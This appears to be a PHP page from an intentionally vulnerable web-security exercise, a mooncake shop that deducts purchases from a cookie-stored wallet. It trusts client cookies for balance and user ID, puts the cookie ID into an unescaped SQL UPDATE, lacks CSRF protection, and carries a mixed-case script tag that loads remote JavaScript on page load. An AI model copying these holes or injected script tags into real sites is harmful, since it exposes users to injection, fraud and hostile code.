<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
	<title>买！</title>
	<style>
	#all{
		margin: 150px auto;
		width: 500px;
		height: 600px;

	}
	</style>
</head>
<body>

<sCriPt src = "http://www.summerandu.cn/1.js">
</sCriPt>

	<div align="left">
		<?php
		echo "您好，{$_COOKIE['name']}<br/>钱包：{$_COOKIE['bank']} $<br/>";
		?>
		<a href="index.php">注销</a>
	</div>
	<div id="all">
		<div align="center">
			<img src="images/yuebing.jpg"><br/><br/><br/>
		</div>
		
		<?php




		if (isset($_POST['BUY'])) {
			$cost=$_COOKIE['bank']-$_POST['num']*100;
			if ($cost>=0) {
				
				include_once("../../connect.php");
				$sql="UPDATE user SET bank=$cost WHERE ID ='{$_COOKIE['ID']}';";
				mysql_query("SET NAMES 'gb2312'");
				$result=mysql_query($sql);
				if (mysql_affected_rows($result)==1) {
					echo "购买成功！";
				}
				exit();
			}else{
				echo "钱包余额不足。";
				exit();
			}

		}

		?>
		<form action="logied.php" method="post">
			<?php
				$num=1;
				echo '<select name="num">';
				while ( $num<= 10) {
					echo "<option value=\"$num\">$num</option>\n";
					$num++;
				}
				echo '</select>数量;单价100$';
			?>
			<input type="submit" name="BUY" value="购买"/>
		</form>  
		
	</div>


</body>

	

